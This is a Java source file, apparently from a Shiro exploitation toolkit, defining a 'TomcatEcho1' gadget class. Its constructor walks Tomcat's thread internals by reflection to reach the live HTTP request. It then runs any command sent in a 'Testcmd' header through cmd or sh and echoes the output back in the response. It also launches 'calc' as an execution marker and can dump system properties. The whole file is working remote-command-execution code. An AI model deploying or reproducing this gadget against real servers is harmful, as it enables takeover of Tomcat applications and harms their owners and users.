package com.y5neko.shiroexp.gadget;


import java.util.Arrays;

public class TomcatEcho1 {
    private static void writeBody(Object resp, byte[] bs) throws Exception {
        Object o;
        Class<?> clazz;

        Runtime runtime = Runtime.getRuntime();
        runtime.exec("calc");

        try {
            clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            o = clazz.newInstance();
            clazz.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(o, new Object[]{bs, 0, bs.length});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
        } catch (ClassNotFoundException | NoSuchMethodException e){
            clazz = Class.forName("java.nio.ByteBuffer");
            o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
        }
    }

    private static Object getFV(Object o, String s) throws Exception {
        java.lang.reflect.Field f = null;
        Class<?> clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                f = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (f == null) {
            throw new NoSuchFieldException(s);
        }
        f.setAccessible(true);
        return f.get(o);
    }

    public TomcatEcho1() throws Exception {
        Object o;
        Object resp;
        String s;
        Runtime.getRuntime().exec("calc");
        boolean done = false;
        Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread t : ts) {
            if (t == null) {
                continue;
            }
            s = t.getName();
            if (!s.contains("exec") && s.contains("http")) {
                o = getFV(t, "target");
                if (!(o instanceof Runnable)) {
                    continue;
                }

                try {
                    o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
                } catch (Exception e) {
                    continue;
                }

                java.util.List<?> ps = (java.util.List<?>) getFV(o, "processors");
                for (Object p : ps) {
                    o = getFV(p, "req");
                    resp = o.getClass().getMethod("getResponse", new Class[0]).invoke(o, new Object[0]);
                    s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testecho"});
                    if (s != null && !s.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{200});
                        resp.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(resp, new Object[]{"Testecho", s});
                        done = true;
                    }

                    s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testcmd"});


                    if (s != null && !s.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{200});
                        String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd", "/c", s} : new String[]{"sh", "-c", s};
                        writeBody(resp, new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes());
                        done = true;
                        System.out.println("命令数组为:" + Arrays.toString(cmd));
                    }

                    System.out.println("命令为:" + s);

                    if ((s == null || s.isEmpty()) && done) {
                        writeBody(resp, System.getProperties().toString().getBytes());
                    }

                    if (done) {
                        break;
                    }
                }

                if (done) {
                    break;
                }
            }
        }
    }

    public static void main(String[] args) {
    }
}